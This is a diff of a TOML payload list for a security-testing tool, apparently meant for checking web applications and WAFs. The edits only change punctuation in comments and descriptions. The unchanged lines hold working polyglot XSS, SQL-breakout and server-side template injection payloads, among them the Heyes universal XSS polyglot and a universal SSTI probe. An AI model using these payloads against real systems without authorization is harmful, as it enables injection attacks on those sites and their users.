@@ -1,13 +1,13 @@
 # Cross-context polyglot payloads.
 #
 # A polyglot is a payload that's syntactically valid in 2+ contexts (SQL+XSS,
-# CMD+XSS, SSTI+XSS, etc.) — it triggers in whichever context the application
+# CMD+XSS, SSTI+XSS, etc.), it triggers in whichever context the application
 # actually uses. Useful when you don't yet know how the parameter is consumed.
 #
 # Adding a polyglot is a one-line PR: append `[[polyglot]]` with payload,
 # contexts, and description.
 #
-# Contexts (free-form strings — common ones: sql, xss, cmd, ssti, html,
+# Contexts (free-form strings, common ones: sql, xss, cmd, ssti, html,
 # javascript, url, jinja2, freemarker, erb, twig, ssrf):
 
 # ── SQL + XSS ──
@@ -96,7 +96,7 @@ description = "Angular sandbox escape via prototype chain"
 [[polyglot]]
 payload = "${7*7}<img src=x onerror=alert(1)>"
 contexts = ["ssti", "xss"]
-description = "SSTI probe + XSS — WAF must detect both"
+description = "SSTI probe + XSS: WAF must detect both"
 
 # ── SQL + CMD / SSRF ──
 [[polyglot]]
@@ -123,19 +123,19 @@ description = "Oracle UTL_HTTP for SSRF via SQL injection"
 [[polyglot]]
 payload = '''jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )///%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'''
 contexts = ["xss", "html", "javascript", "url"]
-description = "Gareth Heyes universal XSS polyglot — works across HTML/JS/URL contexts"
+description = "Gareth Heyes universal XSS polyglot, works across HTML/JS/URL contexts"
 
 [[polyglot]]
 payload = "'\"-->]]>*/</script></style></title></textarea><svg onload=alert(1)>"
 contexts = ["xss", "html", "sql", "ssti"]
-description = "Multi-context escape sequence — breaks out of SQL strings, HTML tags, CDATA, script, style, title, textarea"
+description = "Multi-context escape sequence, breaks out of SQL strings, HTML tags, CDATA, script, style, title, textarea"
 
 [[polyglot]]
 payload = "{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}"
 contexts = ["ssti", "jinja2", "freemarker", "erb", "twig"]
-description = "Universal SSTI probe — Jinja2 + Freemarker + ERB + Twig + Ruby"
+description = "Universal SSTI probe: Jinja2 + Freemarker + ERB + Twig + Ruby"
 
 [[polyglot]]
 payload = "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
 contexts = ["xss", "html", "javascript"]
-description = "Multi-quote-context XSS — works inside single, double, or no quotes"
+description = "Multi-quote-context XSS, works inside single, double, or no quotes"
